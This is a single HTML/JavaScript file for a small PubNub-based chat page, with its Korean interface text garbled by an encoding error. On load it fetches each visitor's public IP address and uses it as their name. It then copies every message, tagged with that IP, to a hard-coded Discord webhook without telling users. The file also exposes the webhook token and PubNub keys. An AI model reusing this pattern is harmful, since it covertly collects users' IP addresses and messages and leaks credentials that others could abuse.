<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ï†ïÌõà.ÏÑúÎ≤Ñ.ÌïúÍµ≠</title>
    <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.7.2.0.min.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #121212; 
            color: #e0e0e0;
            margin: 0;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }

        header {
            background-color: #1f1f1f;
            padding: 15px;
            text-align: center;
            font-weight: bold;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        #status-dot {
            height: 10px;
            width: 10px;
            background-color: #gray;
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
        }

   #chat-container {
            flex: 1;
            padding: 15px;
            padding-bottom: 90px; 
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 12px;
            background-color: #000000;
        }

        .message {
            max-width: 75%;
            padding: 10px 14px;
            border-radius: 18px;
            font-size: 0.95rem;
            line-height: 1.4;
            position: relative;
            word-wrap: break-word;
            display: flex;
            flex-direction: column;
        }

        .sender-name {
            font-size: 0.75rem;
            margin-bottom: 4px;
            opacity: 0.6;
            color: #ccc;
        }

        .message.received {
            align-self: flex-start;
            background-color: #2c2c2c;
            color: #ffffff;
            border-bottom-left-radius: 4px;
        }

        .message.sent {
            align-self: flex-end;
            background-color: #00a884;
            color: #ffffff;
            border-bottom-right-radius: 4px;
        }

#input-area {
            position: fixed; 
            bottom: 20px;    
            left: 15px;      
            right: 15px;
            
            background-color: #1f1f1f; 
            padding: 8px 12px;
            border-radius: 30px; 
            border: 1px solid #333;
            box-shadow: 0 4px 20px rgba(0,0,0,0.6);
            
            display: flex;
            align-items: center;
            gap: 10px;
            z-index: 1000;
            
            margin-bottom: env(safe-area-inset-bottom, 0);
        }

        #msg-input {
            flex: 1;
            background-color: transparent; 
            border: none;
            padding: 10px;
            color: white;
            font-size: 1rem;
            outline: none; 
        }

        #msg-input::placeholder {
            color: #666;
        }

        #send-btn {
            background-color: #00a884;
            color: white;
            border: none;
            border-radius: 50%;
            width: 40px;  
            height: 40px;
            cursor: pointer;
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0; 
            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
        }

        #send-btn:active {
            transform: scale(0.95); 
        }
    </style>
</head>
<body>

    <header>
        <div>
            <span id="status-dot" style="background-color: orange;"></span>
            <span id="header-title">Ïó∞Í≤∞ Ï§ë</span>
        </div>
        <button onclick="changeName()" style="background:none; border:1px solid #1f1f1f; color:#1f1f1f; padding:5px 10px; border-radius:10px; font-size:0.8rem; cursor:pointer;">Ïù¥Î¶Ñ Î≥ÄÍ≤Ω</button>
    </header>

    <div id="chat-container">
        </div>

    <div id="input-area">
        <input type="text" id="msg-input" placeholder="Î©îÏãúÏßÄ ÏûÖÎ†•" autocomplete="off">
        <button id="send-btn" onclick="sendMessage()">‚û§</button>
    </div>

    <script>
        const MY_PUB_KEY = "pub-c-9d5ec1e3-37b9-4f0e-987b-c64229cd3127"; 
        const MY_SUB_KEY = "sub-c-728962a3-1021-4ca5-a8aa-31b7805e12e2"; 
        const CHAT_ROOM_NAME = "Ï±ÑÌåÖÎ∞©1"; 

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1401112676473507880/sXN44L-ZATIhY4N13YyBWSDQdvUp7nAGI9jVyP_hdwKKhvC92eD0d81iMXpipPfaZRvc";
const FIXED_LINK = "https://512wjdgns.github.io/chat/"; 
        let pubnub;
        const myUUID = 'user_' + Math.random().toString(36).substr(2, 9);
        let myName = localStorage.getItem('chat_nickname') || "ÏùµÎ™Ö";

        const chatContainer = document.getElementById('chat-container');
        const statusDot = document.getElementById('status-dot');
        const headerTitle = document.getElementById('header-title');

       window.onload = async function() {

            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                
                myName = data.ip;
                

            } catch (error) {
                console.error("IPÎ•º Í∞ÄÏ†∏Ïò§ÎäîÎç∞ Ïã§Ìå®ÌñàÏäµÎãàÎã§.", error);
                myName = "Unknown_User"; 
            }

            initPubNub();
        };

        function initPubNub() {
            pubnub = new PubNub({
                publishKey: MY_PUB_KEY,
                subscribeKey: MY_SUB_KEY,
                uuid: myUUID
            });

            pubnub.addListener({
                status: function(statusEvent) {
                    if (statusEvent.category === "PNConnectedCategory") {
                        statusDot.style.backgroundColor = "#00a884"; 
                        headerTitle.innerText = `Ï†ïÌõà.ÏÑúÎ≤Ñ.ÌïúÍµ≠: ${myName}`;
                    }
                },
                message: function(event) {
                    displayMessage(event.message, event.publisher);
                }
            });

            pubnub.subscribe({
                channels: [CHAT_ROOM_NAME]
            });
        }

        function sendMessage() {
            const input = document.getElementById('msg-input');
            const text = input.value.trim();
            if (!text) return;

            pubnub.publish({
                channel: CHAT_ROOM_NAME,
                message: { text: text, sender: myName }
            });
sendToDiscord(myName, text);
            input.value = '';
            input.focus();
        }

        function displayMessage(msgData, publisherUUID) {
            const msgDiv = document.createElement('div');
            const isMe = (publisherUUID === myUUID);
            
            msgDiv.classList.add('message', isMe ? 'sent' : 'received');

            if (!isMe) {
                const nameSpan = document.createElement('div');
                nameSpan.classList.add('sender-name');
                nameSpan.innerText = msgData.sender;
                msgDiv.appendChild(nameSpan);
            }

            const textSpan = document.createElement('div');
            textSpan.innerText = msgData.text;
            msgDiv.appendChild(textSpan);

            chatContainer.appendChild(msgDiv);
            chatContainer.scrollTop = chatContainer.scrollHeight;
        }

        function changeName() {
            const newName = prompt("Î≥ÄÍ≤ΩÌï† Ïù¥Î¶ÑÏùÑ ÏûÖÎ†•ÌïòÏÑ∏Ïöî:", myName);
            if (newName) {
                myName = newName;
                localStorage.setItem('chat_nickname', myName);
                headerTitle.innerText = `Ï†ïÌõà.ÏÑúÎ≤Ñ.ÌïúÍµ≠: ${myName}`;
            }
        }

        document.getElementById('msg-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendMessage();
        });

function sendToDiscord(username, message) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("api/webhooks/...")) return;

    const contentWithLink = `Î©îÏÑ∏ÏßÄ: ${message}\nüîóÎ∞îÎ°úÍ∞ÄÍ∏∞: ${FIXED_LINK}`;

    fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            username: username,
            content: contentWithLink 
        })
    }).catch(err => console.error("ÎîîÏä§ÏΩîÎìú Ï†ÑÏÜ° Ïã§Ìå®:", err));
}
    </script>
</body>
